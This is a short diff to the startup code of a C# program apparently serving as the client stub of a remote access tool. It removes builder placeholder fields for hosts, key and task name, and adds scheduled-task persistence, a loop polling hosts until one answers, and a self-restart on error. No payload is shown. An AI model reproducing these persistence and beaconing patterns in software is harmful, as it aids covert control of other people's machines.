@@ -22,15 +22,14 @@ namespace Client
 {
     public static class Starting
     {
-        public static List<Host> HostsList = new List<Host>();
-        public static string ListOfHost = "%HOSTS%";
-        public static string Key = "ThisIsMyKey";
-        public static bool MultipleHost = false;
-        public static string TaskName = "%C%";
-        public static string Time = "%1%";
 
         [STAThread]
         public static void Main()
+        {
+            StartingFunction();
+        }
+
+        private static void StartingFunction() 
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
@@ -38,17 +37,24 @@ namespace Client
             Utils.StartUpTaskScheduler();
             Utils.MakeHostList();
             Host H = Utils.CheckHost();
-            while (H == null) 
+            while (H == null)
             {
                 H = Utils.CheckHost();
                 Thread.Sleep(1000);
             }
+
             try
             {
-                Thread T = new Thread(() => { Client C = new Client(H); });
+                Thread T = new Thread(() =>
+                {
+                    Client C = new Client(H);
+                });
                 T.Start();
             }
-            catch{}
-        }    
+            catch
+            {
+                StartingFunction();
+            }
+        }
     }
 }
